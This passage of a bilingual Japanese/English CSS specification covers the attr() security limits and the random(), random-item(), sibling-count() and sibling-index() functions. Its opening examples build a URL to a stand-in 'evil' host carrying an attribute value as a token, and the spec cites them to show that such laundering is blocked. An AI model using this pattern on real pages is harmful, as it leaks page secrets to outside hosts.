`background-image: src(string("http://example.com/evil?token=" attr(foo)))$p
⇒
別の関数を通しても，値を “洗浄-” できない。
◎
background-image: src(string("http://example.com/evil?token=" attr(foo))) - can’t "launder" it thru another function.
</li>
	<li>
`--foo:attr(foo)^p
（ `--foo^p は文字列~構文を伴う`登録-済み~custom~prop$とする）
が宣言された下での，
`background-image:src(var(--foo))^p
⇒
別の~propを通しても，値を洗浄できない。
◎
--foo: attr(foo); background-image(src(var(--foo))) (assuming that --foo is a registered custom property with string syntax) - can’t launder the value thru another property, either.
</li>
</ul>
</div>

<p class="note">注記：
この制約を実装するためには、
`attr$f 値から構築された値に対し，~dirty~bit【洗浄されたか否か】を追跡することが要求される
— それらは、
`登録-済み~custom~prop$を介して，全部的に文字列へ解決され得るので、
表出された値を精査するだけには依拠できないので。
非-文字列~型でも、
他の型の値を文字列~化し得る関数
— `string^f【`string＠~CSSCONTENT#funcdef-string$f？】 など —
を介して，これを誘発し得ることに注意：
`--foo:attr(foo number)^p
が宣言されていたなら，
`background-image:src(string(var(--foo)))^p
も無効になる必要がある。
◎
Note: Implementing this restriction requires tracking a dirty bit on values constructed from attr() values, since they can be fully resolved into a string via registered custom properties, so you can’t rely on just examining the value expression. Note that non-string types can even trigger this, via functions like string() that can stringify other types of values: --foo: attr(foo number); background-image: src(string(var(--foo))) needs to be invalid as well.
</p>

			</section>
		</section>
	</section>
	<section id="randomness">
<h2 title="Generating Random Values">7. ~randomな値の生成-法</h2>

<p>
設計に ある程度の “~random性” を組入れると有用になることが多い
— 同じ~page内で繰返される要素に多少の “ゆらぎ” が感じられるようにしたり，
~pageに気が散らないほどの “華を添える” ために。
◎
It is often useful to incorporate some degree of "randomness" to a design, either to make repeated elements on a page feel less static and identical, or just to add a bit of "flair" to a page without being distracting.
</p>

<p>
`~random関数@
と総称される［
`random$f, `random-item$f
］関数は、
作者が［
自身の~pageの中へ~random性を組入れる
］ことを許容する
— それは、［
この~random性を設計~視点からは予測-可能に保つ
］一方で，
~randomな値を［
複数箇所で再利用するべきか，~instanceごとに一意になるべきか
］は作者に裁定してもらう。
◎
The random() and random-item() functions (the random functions) allow authors to incorporate randomness into their page, while keeping this randomness predictable from a design perspective, letting authors decide whether a random value should be reused in several places or be unique between instances.
</p>

<p>
~randomな数-を生成する正確な手法は、
~UAにより定義される。
2 つの別個な~random値の相関は，容易に検出-可能になる`べきではない^emが、
この仕様は，［
それが暗号-強度の用語で何を意味するか
］は意図的に指定しない。
作者は、
高品質な暗号に依存する目的においては，
`~random関数$に依拠しては`ナラナイ^em。
◎
The exact random-number generation method is UA-defined. It should be the case that two distinct random values have no easily-detectable correlation, but this specification intentionally does not specify what that means in terms of cryptographic strength. Authors must not rely on random functions for any purposes that depend on quality cryptography.
</p>

		<section id="random">
<h3 title="Generating a Random Numeric Value: the random() function">7.1. ~randomな数量-値の生成-法： `random^f 関数</h3>

<p>
`random@f
関数は、
`~math関数$であり，
ある範囲内で一様に分布する~randomな値を表現する。
【以下、この節に現れる~randomは，一様（すべての値は、同じ~~確率で選ばれる）と見做される。】
それはまた、
任意選択で，アリな値を［
最小~値からの差が，ある段差の整数倍になる
］よう制限できる。
その構文は：
◎
The random() function is a math function that represents a random value between a minimum and maximum value, drawn from a uniform distribution, optionally limiting the possible values to a step between those limits:
</p>

<pre class="prod">
`random()^t
	= random(
		`random-caching-options$t? ,
		`calc-sum$t,
		`calc-sum$t,
		[by `calc-sum$t]? )

`random-caching-options@t
	= `dashed-ident$t || per-element
</pre>

<p>
その引数たちは：
◎
Its arguments are:
</p>

<dl class="valdef">
	<dt>`random-caching-options$t</dt>
	<dd>
省略可能な この引数は、
当の `random$f 関数が［
~page上の他の `random^f 関数と類似に解決されるか否か
］に対する，いくぶんの制御を供する。
詳細は、
`§ ~randomな値の生成-法／~cache法＠#random-caching$
を見よ。
◎
The optional &lt;random-caching-options&gt; provides some control over whether a given random() function resolves similarly or differently to other random()s on the page. See § 7.3 Generating/Caching Random Values: the &lt;random-caching-options&gt; value for details.
</dd>
	<dd class="note">
<p>
注記：
`random$f 関数は：
◎
↓</p>
		<ul>
			<li>
この引数が省略された場合、［
それを含んだ~styleを利用している要素~すべて
］から共有される単独の値に解決される。
2 つの `random^f 関数は、
互いの引数たちがすべて一致するならば，同じ~randomな値に解決されることになる。
◎
By default, random() resolves to a single value, shared by all elements using that style, and two random() functions with identical arguments will resolve to the same random value.
</li>
			<li>
この引数に `dashed-ident$t が供された場合、［
他の引数は一致する他の `random$f 関数
］とは別物にして，別個な値を生成させる。
◎
Providing a &lt;dashed-ident&gt; does nothing, but can make the argument lists distinct between two or more otherwise-identical random() functions, so they’ll generate distinct values.
</li>
			<li>
この引数に `per-element^v ~keywordが供された場合、
当の関数が適用される`要素ごと^emに異なる値を生成させる
— ~stylesheet内での各利用ごとに単独の値に解決されるのではなく。
◎
The per-element keyword causes the random() function to generate a different value on each element the function is applied to, rather than resolving to a single value per usage in the stylesheet.
</li>
		</ul>
	</dd>

	<dt>`calc-sum$t, `calc-sum^t</dt>
	<dd>
これら 2 個の要求される`計算式$は、
順に，当の関数を解決した結果がとり得る範囲の［
最小~値, 最大~値
］を指定する。
◎
The two required calculations specify the minimum and maximum value the function can resolve to. Both limits are inclusive (the result can be the min or the max).
</dd>
	<dd>
［
最大~値 ~LTE 最小~値
］の場合、
最大~値は最小~値と等しいものとして挙動する。
◎
If the maximum value is less than the minimum value, it behaves as if it’s equal to the minimum value.
</dd>
	<dd class="example">
例えば， `random(100px, 300px)^v は、
`100px^v 以上 `300px^v 以下の~randomな `length$t に解決されることになる。
◎
For example, random(100px, 300px) will resolve to a random &lt;length&gt; between 100px and 300px: it might be 100px, 300px, or any value between them like 234.5px.
</dd>

	<dt>`by^v `calc-sum$t</dt>
	<dd>
省略可能な最後の引数は、
段差~値を指定する。
当の関数を解決した結果は、
最小~値からの差が段差の整数倍になるよう制約され，
そこから~randomに選ばれる。
◎
The final optional argument specifies a step value: the values the function can resolve to are further restricted to the form min + (N * step), where N is a non-negative integer chosen uniformly randomly from the possible values that result in an in-range value.
</dd>
	<dd class="example">
<p>
例えば、
`random(100px, 300px, by 50px)^v
を解決した結果は，［
`100px^v,
`150px^v,
`200px^v,
`250px^v,
`300px^v
］いずれかに限られ、
`120px^v 様な値を返すことは決してない。
◎
For example, random(100px, 300px, by 50px) can only resolve to 100px, 150px, 200px, 250px, or 300px; it will never return a value like 120px.
</p>

<p>
結果が最小~値になることは，常にアリな一方、
最大~値になることは
— 最小~値との差が段差の整数倍である場合を除き —
アリでない。
例えば，［
`random(100px, 300px, by 30px)^v を解決した結果
］としてアリな最~大な値は、
`280px^v （ ~EQ 最小~値 ~PLUS 段差 ~MUL 6 ）になる。
◎
While the minimum value is always a possible result, the maximum value isn’t always, if it’s not also a multiple of the step from the minimum. For example, in random(100px, 300px, by 30px), the largest possible value it can resolve to is 280px, 6 steps from the minimum value.
</p>

<p>
これには、
丸ngが影響し得ることに注意：
`random(100px, 200px, by 100px / 3)^v
にアリな値は， 3 通り
— `100px^v, 約 `133.33px^v, 約 `166.67px^v —
以上はあるが、
`200px^v がアリになるかどうかは，丸ngの精度に依存する。
安全になるためには、
最大~値を期待される最~大な値より`少し大きく^emすればよい
— `random(100px, 201px, by 100px / 3)^v の様に。
◎
Note that rounding issues might have an effect here: in random(100px, 200px, by 100px / 3) you’ll definitely get three possible values (100px, and approximately 133.33px and 166.67px), but whether 200px is possible depends on rounding precision. To be safe, you can put the maximum value slightly above where you expect the final step to land, like random(100px, 201px, by 100px / 3).
</p>
	</dd>
	<dd class="example">
<p>
`round$f の定義にて説明したとおり，~CSSの値には “生来な” 精度は無いが、
段差~値を利用すれば，精度をアテガえる
— 例えば：
</p>
		<ul>
			<li>
`random(100px, 500px, by 1px)^v は、
解決した結果を `1px^v の整数倍に限るよう制約する。
</li>
			<li>
`random(1, 10, by 1)^v は、
解決した結果を整数に限るよう制約する。
</li>
		</ul>

◎
As explained in the definition of round(), CSS has no "natural" precision for values, but the step value can be used to assign one.
◎
For example, random(100px, 500px, by 1px) restricts it to resolving only to whole px values; random(1, 10, by 1) is restricted to resolving only to integers; etc.
</dd>
	<dd class="note">注記：
段差の定義は、
素朴に［
範囲~内の~randomな値を生成した結果を最も近い段差~値に丸める
］ことを許容するもの`ではない^em
— そうすると、
結果の各~値は，同じ~~確率で現れなくなるので。
例えば，
`random(100px, 200px, by 50px)^v は、
アリな 3 通りの値を同じ 1/3 の~~確率で生成する必要がある
— 素朴な丸ngに基づく手法は、
`150px^v を［
両端を成す他の値
］の 2 倍の~~確率で生成するので，不正である。
◎
Note: The definition of the step does not allow for naively generating a random value in the range and then rounding it to the nearest step value, as that can result in the values not appearing with the same weights. For example, random(100px, 200px, by 50px) has to generate the three possible values each with a 1/3 chance; a naive rounding-based method will instead incorrectly generate 150px twice as often as the boundary values.
</dd>
</dl>

<p>
入力を成す`計算式$たち %計算式たち は、
それを成す各~計算式は［
`number$t ／ `dimension$t ／ `percentage$t
］いずれにも解決され得るが，
`一貫した型を有して$いなければナラナイ
【！but must have the same type（おそらく更新漏れ）】
— さもなければ、
当の関数は無効になる。
当の関数の`型$は、
%計算式たち の`一貫した型$になる
【！have the same type as（おそらく更新漏れ）】。
◎
All of the calculation arguments can resolve to any &lt;number&gt;, &lt;dimension&gt;, or &lt;percentage&gt;, but must have the same type, or else the function is invalid; the result will have the same type as the arguments.
</p>

<div class="example">
<p>
例えば：
◎
For example,＼
</p>
<ul>
	<li>
`random(50px, 100%, by 1em)^v は、
百分率は［
これを利用した文脈において妥当である
］かつ［
`length$t に解決される
］と見做すならば，妥当になる
— どの引数も，長さに解決されるので。
◎
random(50px, 100%, by 1em) is valid (assuming percentages are valid in the context this is used, and resolve to a &lt;length&gt;), as all three arguments resolve to a length.
</li>
	<li>
`random(50px, 180deg)^v は、
長さと角度が同じ`型$ではないので，妥当でない。
◎
However, random(50px, 180deg) is invalid, as lengths and angles are not the same type.
</li>
</ul>
</div>

<p>
`random$f 関数は、
引数として与えた`計算式$を数量-値に単純~化できるようになり次第，
`単純~化＠~CSSVAL#simplify-a-calculation-tree$できる。
◎
A random() function can be simplified as soon as its argument calculations can be simplified to numeric values.
</p>

<p class="note">注記：
このことは、［
`random$f は、
`通例的には^em `算出d値$の時点で解決されるので，静的な数量-値として継承される
］ことを意味する。
しかしながら，
引数として与えた`計算式$が`使用~値$の時点まで解決されない場合
（ `percentage$t 値を含んでいて，解決するためには~layout情報が要求される場合など）、
`継承$は `random$f 関数~自体を転送することになる
（しかしながら，これは、
`percentage$t 自身の挙動と異なるものでない
— それは、
`percentage$t として継承されるので，
子~要素~上では異なる値に解決されるかもしれない）。
◎
Note: This means that random() is usually resolved by computed value time, and thus will inherit as a static numeric value. However, if the argument calculations aren’t resolved until used value time (such as if they include &lt;percentage&gt; values that require layout information to resolve), inheritance will transfer the random() function itself. (This is no different, however, to the behavior of the &lt;percentage&gt;s themselves, which would inherit as &lt;percentage&gt;s and thus might resolve to different values on the child elements.)
</p>

<p class="issue">
少なくとも理論~上は、
`per-element^v が指定されない限り，
`random$f を~prop以外の文脈で利用しても大丈夫なはずである。
例えば、
<code class="css">`media^at (max-width: random(100px, 500px)) {...}</code>
で何が起こるかは，きちんと定義される。
とは言え、
それを許容することが求まれるのかどうかは，疑わしい。
◎
At least in theory it should be fine to use random() in non-property contexts, so long as per-element isn’t specified; it’s well-defined what happens with @media (max-width: random(100px, 500px)) {...}, for example. I suspect we want to disallow it, tho?
</p>

			</section>
			<section id="random-infinities">
<h4 title="Argument Ranges">7.1.1. 引数の範囲</h4>

<p>
`random(A, B, by C)^f においては：
◎
In random(A, B, by C),＼
</p>
<ul>
	<li>
%A, %B いずれかが無限である場合，
結果は ~NaN になる。
◎
if A or B is infinite, the result is NaN.＼
</li>
	<li>
<p>
%C が無限である場合，
結果は %A になる。
◎
If C is infinite, the result is A.
</p>

<p>
（ %C ~LTE 0 の場合、
標準な定義から外れるが，結果は %A になる。）
◎
(If C is zero or negative, the result is A, but that falls out of the standard definition.)
</p>
	</li>
</ul>

<p class="note">注記：
通例の`~math関数$と同じく、
いずれかの計算式~引数が ~NaN になる場合，
結果は~NaNになる。
◎
Note: As usual for math functions, if any argument calculation is NaN, the result is NaN.
</p>

		</section>
		<section id="random-item">
<h3 title="Picking a Random Item From a List: the random-item() function">7.2.  ~listから~randomな~itemを選び取る： `random-item$f 関数</h3>

<p>
`random-item@f
関数は、
2 個目以降の引数たちが成す~listから~randomに選ばれる~itemに解決される。
◎
The random-item() function resolves to a random item from among its list of items.
</p>

<pre class="prod">
`random-item()$t
	= random-item( `random-caching-options$t , [ `declaration-value$t? ]# )
</pre>

<p>
この関数においては、
`random-caching-options$t は`要求される^em。
それは、
`random$f のときと同じに解釈される
（詳細は、
`§ ~randomな値の生成-法／~cache法＠#random-caching$
を見よ）。
◎
The required &lt;random-caching-options&gt; is interpreted identically to random(). (See § 7.3 Generating/Caching Random Values: the &lt;random-caching-options&gt; value for details.)
</p>

<div class="note">
<p>注記：
`random$f と同様に、［
`dashed-ident$t ／ `per-element^v 
］を利用すれば，［
類似な `random-item$f 関数たちが別個な~random値を生成する／
要素ごとに別個な値に解決される
］よう強制できる。
◎
Like random(), the &lt;dashed-ident&gt; can be used to force similar random-item() functions to generate distinct random values, and per-element causes it to resolve to a distinct value on each element.
</p>

<p>
これらは別として、
`random-item$f 関数たちの~group分けは，
`random$f より ずっと単純である
— 関数どうしが “一致するか” どうかは、
引数の個数のみに基づく。
◎
Aside from these, the grouping of random-item() functions as "identical" is much simpler: all that matters is the number of arguments.
</p>

<p>
すなわち，
`random-item(--x, red, blue, green)^v
と
`random-item(--x, 1, 2, 3)^v
は、
常に同じ引数~indexに解決され，［
`red$v, `1^v ／
`blue$v, `2^v ／
`green$v, `3^v
］いずれかになる。
これは、［
~randomな値たちが成す集合を利用するよう求まれる~prop
］たちが成す~groupどうしの協調を許容する。
◎
That is, random-item(--x, red, blue, green) and random-item(--x, 1, 2, 3) will always resolve to the same argument index: either red and 1, or blue and 2, or green and 3. This allows coordination between groups of properties that all want to use a random set of values.
</p>

<p>
他方、
`random-item(--x, red, blue, green)^v
と
`random-item(--x, 1, 2, 3, 4)^v
には何ら繋がりはなく，
12 通りある どの組合nも生じ得る。
◎
On the other hand, random-item(--x, red, blue, green) and random-item(--x, 1, 2, 3, 4) will have no connection to each other; any of the 12 possible combinations can occur.
</p>
</div>

<div class="note">
<p>注記：
`random-caching-options$t 引数が
`random$f においては省略可能な一方，
`random-item$f においては要求されるわけは：
◎
Note: The &lt;random-caching-options&gt; argument is required in random-item(), but optional in random(), both＼
</p>
<ul>
	<li>
構文解析の理由
（ `random-item(--foo, --bar, --baz)^v が
3 個の `declaration-value$t 引数をとるのか，
2 個のそれと `random-caching-options$t 引数をとるのか伝えることはアリでない）。
◎
for parsing reasons (it’s impossible to tell whether random-item(--foo, --bar, --baz) has three &lt;declaration-value&gt; arguments or two and a &lt;random-caching-options&gt; argument),＼
</li>
	<li>
省略可能にすると、［
`random-item^f 関数の~instanceどうしを判別するために利用されるもの
］は，引数の個数しかなくなる
— その結果、
別個な~random生成になるべき関数たちが，不用意に一緒くたにされ易くなる。
◎
and because accidentally associating the random generation of random-item() functions together is much easier to do accidentally, since only the number of arguments is used to distinguish instances.
</li>
</ul>
</div>

<p>
残りの引数は、
~CSS値たちが成す任意な連列である。
`random-item$f 関数は、
この連列から~randomに選ばれる一つに解決される。
◎
The remaining arguments are arbitrary sequences of CSS values. The random-item() function resolves to one of these sequences, chosen uniformly at random.
</p>

<p>
`random-item$f 関数は、
`var$f の様な`任意的~代用~関数$である。
◎
The random-item() function is an arbitrary substitution function, like var().
</p>

<div class="note">
<p>注記：
すなわち，
`random-item$f を利用する場合：
◎
That is, if you use random-item():
</p>
<ul>
	<li>
`random-item$f （および他の`任意的~代用~関数$）自体は、
構文上は妥当である限り，
~prop全体が構文解析-時点では妥当であると見做される。
◎
So long as random-item() itself (and any other arbitrary substitution functions) is syntactically valid, the entire property is assumed to be valid at parse time.
</li>
	<li>
`random-item$f は、
`算出d値$の時点で
— `var$f を`代用する＠~CSSVAR#substitute-a-var$ときと同じく —
［
何であれ それを解決した結果の値
］で代用される
— したがって、
すべての子は，同じ解決した結果の値を継承する。
◎
random-item() is substituted with whatever value it resolves to at computed value time when you’d substitute a var(), so children all inherit the same resolved value.
</li>
	<li>
値で代用した結果，~propが無効になる場合、
当の~propの値は，`無効が保証される値$になる。
◎
If the substituted value ends up making the property invalid, the property’s value becomes the guaranteed-invalid value.
</li>
</ul>
</div>

<p class="issue">
`任意的~代用~関数@
を定義する
— おそらく `CSS-VARIABLES-2$r において。
この “代用” に類する機能性を備える関数が，いくつか控えているので。
◎
Define arbitrary substitution function, probably over in Variables, since we have several upcoming functions leaning on this functionality.
</p>

<p class="issue">
`random-item$f は， `var$f の様にふるまうで、
おそらく，
~prop内に限り利用-可能になるよう制約することが求まれる
（このことは、
そのようなどの関数にも適用するよう求まれる見込みが高い）。
`random$f は，根本的に異なる種類の値であるが、
~thema的な一貫性を得るため，おそらく それも制約するよう求まれる。
◎
Since random-item() is var()-like, we probably want to restrict it to only be usable in properties. (This is likely something we want to apply to all such functions.) Tho random() is a fundamentally different kind of value, we probably want to restrict it as well, for thematic consistency.
</p>

		</section>
		<section id="random-caching">
<h3 title="Generating/Caching Random Values: the &lt;random-caching-options&gt; value">7.3. ~randomな値の生成-法／~cache法： `random-caching-options$t 値</h3>

<p>
~JSの様な~programming言語においては，
~code内に明瞭な時間的~順序付けが在るので、
`Math.random()^c に対する~callの様なものが`いつ評価されるか^emを正確に伝えれる。
結果は変数~内に格納できるので、
複数の箇所で［
単独の~randomな値を再利用しているのか，別個な~random値を利用しているのか
］は，明瞭になる。
◎
In a programming language like JavaScript, there’s a clear temporal ordering to code, so you can tell exactly when something like a call to Math.random() is evaluated. You can also store the results in a variable, making it clear when you’re reusing a single random value in multiple places, versus using a distinct random value in each location.
</p>

<p>
他方，~CSSは宣言的な言語なので
（~codeは、
特定0の順序で “実行される” ことはなく，
何かが何回 “実行されるか” に対する制御も無い）、
同じ~styleを複数の要素に適用することは，ごく容易であるが：
◎
CSS, on the other hand, is a declarative language (code is not "executed" in any particular order, nor is there any control over how many times something is "executed");＼
it makes it very easy to apply identical styles to multiple elements but＼
</p>
<ul>
	<li>
各~要素に別個な値を指定することは困難である
（ `random$f が［
それを利用している~propが適用される各~要素
］に対し［
同じ値, 別個な値
］どちらに解決するよう意味されるかは、
不明瞭である）。
◎
difficult to specify distinct values for each of them (making it unclear whether a property using random() is meant to resolve to the same value on each element it’s applied to or to distinct values on each);＼
</li>
	<li>
“変数” の機能性は，ごく制限される
（特定0の［
~randomに生成された値
］を何箇所かで意図的に再利用することは、
困難である）。
◎
and it has very limited "variable" functionality (making it difficult to intentionally reuse a particular randomly-generated value in several places).
</li>
</ul>

<p>
これらの課題を解決するため、
`~random関数$【！the random() and random-item() functions】は，
次に挙げる［
~cache法の意味論
］の下で~randomな値を生成するものと定義される：
◎
To resolve these issues, the random() and random-item() functions are defined to generate random values under the following caching semantics:
</p>
<ul>
	<li>
<p>
~stylesheet内の各［
`~random関数$【！`random$f or `random-item$f】の~instance
］は、
`~random~cache用~key@
を指定する。
［
`random$f たち／ `random-item$f たち
］【！Two instances of either function】は、
`~random~cache用~key$が［
一致するならば`一致する値^em／
異なるならば`別個な値^em
］（順不同）に解決するモノトスル。
◎
Each instance of random() or random-item() in a stylesheet specifies a random-caching key. Two instances of either function must resolve to identical values if their random-caching keys are identical; they must resolve to distinct values if they’re different.
</p>

<p>
（ここでの “別個” とは、［
ある新規な~random演算により生成される
］ことを意味する
— その結果は、
別の~random演算と偶然~同じ値になるかもしれないが。）
◎
("Distinct" here means generated by a fresh random operation; this might coincidentally result in the same value as another random operation.)
</p>
	</li>
	<li>
<p>
`random$f 用の`~random~cache用~key$は、
次に挙げるものからなる`~tuple$である：
◎
For random(), the random-caching key is a tuple of:
</p>
		<ol>
			<li>
最小を与える`計算式$の`使用~値$。
◎
The used value of the minimum calculation.
</li>
			<li>
最大を与える`計算式$の`使用~値$。
◎
The used value of the maximum calculation.
</li>
			<li>
段差を与える`計算式$が［
在るならば その`使用~値$／
無いならば ~NULL
］。
◎
The used value of the step calculation, if present, or null otherwise.
</li>
			<li>
`random-caching-options$t を成す `dashed-ident$t は［
在るならば それ／
無いならば ~NULL
］。
◎
The &lt;dashed-ident&gt; part of the &lt;random-caching-options&gt;, if present, or null otherwise.
</li>
			<li>
`random-caching-options$t 内に `per-element^v が指定された場合、
当の関数が現れる［
要素／疑似要素
］ごとに一意な値。
◎
If per-element is specified in the &lt;random-caching-options&gt;, a unique value per element or pseudo-element the function appears in.
</li>
		</ol>
	</li>
	<li>
<p>
`random-item$f 用の`~random~cache用~key$は、
次に挙げるものからなる`~tuple$である：
◎
For random-item(), the random-caching key is a tuple of:
</p>
		<ol>
			<li>
当の関数に与えられた引数の個数。
◎
The number of arguments to the function.
</li>
			<li>
`random-caching-options$t を成す `dashed-ident$t は［
在るならば それ／
無いならば ~NULL
］。
◎
The &lt;dashed-ident&gt; part of the &lt;random-caching-options&gt;, if present, or null otherwise.
</li>
			<li>
`random-caching-options$t 内に `per-element^v が指定されたならば、
当の関数が現れる［
要素／疑似要素
］ごとに一意な値。
◎
If per-element is specified in the &lt;random-caching-options&gt;, a unique value per element or pseudo-element the function appears in.
</li>
		</ol>
	</li>
</ul>

<p>
［
要素／疑似要素
］ごとに “一意な値” の存続期間は、［
当の要素／当の疑似要素の`出自の要素$
（および当の疑似要素を一意に識別するために足る追加的な報）
］への~JS参照と同じになるモノトスル。
別々な文書~内の要素どうしは、
別個な一意な値をとる`べきである^em
（同じ~pageであっても、
別個な文書を生産する場合
— 例：~pageが~refreshされた前後 —
には，別々な文書とされる）。
（このことは，厳密には［
これらの値の疑似-~random生成を許容するために要求されるもの
］ではないが、
一意~性は，作者が［
要素たちが文書どうしで同じ値をとること
］に依存し得なくするには十分なはずと見込まれる。）
◎
The "unique value per element or pseudo-element" must have the same lifetime as a JavaScript reference to the element (or to the originating element + sufficient additional info to uniquely identify the pseudo-element). Elements in separate documents (including across refreshes of the same page, which produces distinct documents with distinct elements) should have distinct unique values. (This is not strictly required, to allow for pseudo-random generation of these values, but uniqueness should be likely enough that authors cannot depend on elements having the same values across documents.)
</p>

<p>
加えて，~random生成~methodは、
同じ演算であっても異なる文書（同じ~pageの~refreshも含む）で呼出されたときは，別個な値を生成する`ベキ^emである。
◎
Additionally, the random generation method should generate distinct values for the same operation when invoked on different documents (including refreshes of the same page).
</p>

<div class="example">
<p>
例えば、
次の~stylesheetにおいて：
◎
For example, in the following stylesheet:
</p>

<pre class="lang-css">
.random-square {
  width: random(100px, 500px);
  height: random(100px, 500px);
}
</pre>

<p>
両~関数の`~random~cache用~key$は、
どちらも
( `100px^v, `500px^v, ~NULL, ~NULL, ~NULL )
になり，一致する。
このことは、
どちらも正確に同じ値に解決されることを意味する
— その結果、
`.random-square^css に合致している要素たちは，［
縦幅, 横幅とも同じ［
`100px^v 以上 `500px^v 以下のどこかにある~size
］を伴う正方形になる
］かつ［
どの要素も同じ~sizeになる
］ことが保証される。
◎
The random-caching keys for both functions are identical: (100px, 500px, null, null, null). This means that both will resolve to the exact same value, guaranteeing a square element with a size somewhere between 100px and 500px. Additionally, every .random-square element will have the same size.
</p>

<p>
他方，次の~stylesheetでは：
◎
On other hand, in this stylesheet:
</p>

<pre class="lang-css">
.random-rect {
  width: random(100px, 500px);
  height: random(--x, 100px, 500px);
}
</pre>

<p>
両~関数の`~random~cache用~key$は、
別個になる
⇒＃
`width$p においては ( `100px^v, `500px^v, ~NULL, ~NULL, ~NULL ),
`height$p においては ( `100px^v, `500px^v, ~NULL, `--x^v, ~NULL )
◎
The random-caching keys are distinct between the two functions: the function in width has (100px, 500px, null, null, null), while the function in height has (100px, 500px, null, --x, null).
</p>

<p>
すなわち、
両~関数は別個な~random値に解決され，要素は およそ正方形にならない。
それでも、
`.random-rect^css に合致している要素たちは，
`同じ^em~randomな~sizeを有することになる。
◎
This means the two functions will resolve to distinct random values, making it very unlikely for the element to be square. However, every element matching .random-rect will still have the same random size.
</p>

<p>
この~keyは、
関数を成す どの側面を変更しても，改められる。
類似に、
次の 2 個の宣言は別個になる
— 結果の横幅と縦幅には何ら繋がりはない：
◎
Changing any aspect of the function also alters this key. The following two declarations are similarly distinct, resulting in the width and height having no connection to each other:
</p>

<pre class="lang-css">
.random-rect-2 {
  width: random(100px, 500px);
  height: random(100px, 500px, by 50px);
}
</pre>

<p>
2 つの関数は、
見かけは異なっていても，【各~引数の】`使用~値$が一致するならば一致する。
例えば，次の~codeでは：
◎
But so long as the used values end up identical, two functions that look distinct might end up identical. For example, in the following code:
</p>

<pre class="lang-css">
.random-square-2 {
  font-size: 16px;
  width: random(160px, 320px);
  height: random(10em, 20em);
}
</pre>

<p>
2 つの関数は，見かけ上は異なるが、
`~random~cache用~key$は，
長さを全部的に解決した後には どちらも
( `160px^v, `320px^v, ~NULL, ~NULL, ~NULL )
になるので、［
横幅, 縦幅
］は，実際には常に一致するようになる。
◎
The two functions superficially look different, but after the lengths are fully resolved they end up with identical random-caching keys; each is (160px, 320px, null, null, null), so actually the widths and heights will end up always identical.
</p>
</div>

<div class="example">
<p>
既定では、
~stylesheet内の各［
`random$f 関数の~instance
］は，本質的に静的な値に解決され、
当の~propが適用される要素~すべてから共有される。
この挙動は、
`per-element^v ~keywordで変更できる。
◎
By default, each instance of a random() function in a stylesheet essentially resolves to a static value, which is then shared by every element that property applies to. This behavior can be changed with the per-element keyword.
</p>

<p>
例えば、
次においては：
◎
For example, in:
</p>

<pre class="lang-css">
.foo { width: random(100px, 500px); }
</pre>

<p>
`.foo^css に合致している要素たちの横幅は，
同じ~randomな値になるが、
次においては：
◎
Multiple elements matching .foo will end up with the same random width.
◎
But in:
</p>

<pre class="lang-css">
.foo { width: random(per-element, 100px, 500px); }
</pre>

<p>
`.foo^css に合致している各~要素は、
自前の`一意^emな横幅を取得することになる。
◎
Every element matching .foo will get its own unique width.
</p>

<p>
これは，値を要素ごとに一意にするが、
`値ごと^emに一意になることは必要yでないことに注意。
例えば、
次においては：
◎
Note that this causes the value to be unique per element, not per value necessarily. For example, in:
</p>

<pre class="lang-css">
.random-squares {
  width: random(per-element, 100px, 500px);
  height: random(per-element, 100px, 500px);
}
</pre>

<p>
`.random-squares^css に合致している要素たちは，互いに別個な~random値を取得するが、
各~要素の［
`width$p, `height$p
］~propは，どちらも`同じ値^emをとり，要素を正方形にする。
— それらの~propの`~random~cache用~key$は
( `100px^v, `500px^v, ~NULL, ~NULL, 当の要素~用の一意な値 )
であり、
どちらの関数も同じ要素~上では同じ長さに解決されるので。
◎
Every element matching .random-squares will get a distinct random value, but that value will be the same for width and height on a given element, making the element square. This is because in both properties the random-caching key is (100px, 500px, null, null, [unique value for the element]), so both functions will resolve to the same length on a single element.
</p>

<p>
これは、
`~custom~prop$における~randomな値が，より予測-可能に動作するようにする。
上の~codeは、
次のように書くこともできる：
◎
This makes random values in custom properties act more predictably. The preceding code could also be written as:
</p>

<pre class="lang-css">
.foo {
  --size: random(per-element, 100px, 500px);
  width: var(--size);
  height: var(--size);
}
</pre>
</div>

		</section>
	</section>
	<section id="tree-counting">
<h2 title="Tree Counting Functions: the sibling-count() and sibling-index() notations">8. ~tree計数~関数： `sibling-count^f, `sibling-index^f 記法</h2>

<p>
`sibling-count@f
`関数-記法$は、
この記法を利用した要素の親の子~群を成す`要素$の総数を `integer$t として表現する。
◎
The sibling-count() functional notation represents, as an &lt;integer&gt;, the total number of child elements in the parent of the element on which the notation is used.
</p>

<p>
`sibling-index@f
`関数-記法$は、［
この記法を利用した要素は，その親の子~群を成す何個目の要素なのか
］を
— `nth-child()$ps と同様に 1 から数える —
`integer$t として表現する。
◎
The sibling-index() functional notation represents, as an &lt;integer&gt;, the index of the element on which the notation is used among the children of its parent. Like :nth-child(), sibling-index() is 1-indexed.
</p>

<p class="note">注記：
`counter$f 関数は，
`sibling-index$f と類似な能を供せるが、
それは， `integer$t ではなく `string$t を返す。
◎
Note: The counter() function can provide similar abilities as sibling-index(), but returns a &lt;string&gt; rather than an &lt;integer&gt;.
</p>

<p>
これらの関数は、
`疑似要素$に利用されたときは，
その`最終的な出自の要素$で指定されたかのように解決される。
◎
When used on a pseudo-element, these both resolve as if specified on its ultimate originating element.
</p>

<p class="note">注記：
［
`sibling-count$f,
`sibling-index$f
］は、
他の（`選択子$以外の）~CSSと同様に，
`平坦~化された要素~tree$に対し演算する
◎
Note: Like the rest of CSS (other than selectors), sibling-count() and sibling-index() operate on the flat tree.
</p>

<p class="note">注記：
これらの関数は、
将来においては，拡張され得る
—  `nth-child()$ps と類似に，
子~群を下位集合に~filterするための <var class="prod">of `selector^t</var> 引数を受容するよう。
◎
Note: These functions may, in the future, be extended to accept an of &lt;selector&gt; argument, similar to :nth-child(), to filter on a subset of the children.
</p>

	</section>
	<section id="calc-size">
<h2 title="Calculating With Intrinsic Sizes: the calc-size() function">9. 内在的~sizeを伴う計算-法： `calc-size^f 関数</h2>

<p>
`calc$f 関数は、［
2 個の `確定的~size$の合間で遷移するとき／
既存の`確定的~size$を少し調整するとき
］には，申し分なく働く
（例：
`100%^v と `20px^v の中間点は `calc(50% + 10px)^v で得られ,
両~側に~margin `15px^v を伴う `20%^v は `calc(20% + 15px * 2)^v で得られる,
等々）。
が，そのような演算は、［
遷移する／調整する
］よう求まれる~sizeが`内在的~size$である場合には，もはやアリでない
— それには、
実施~上の理由も後方-互換性の理由もある。
◎
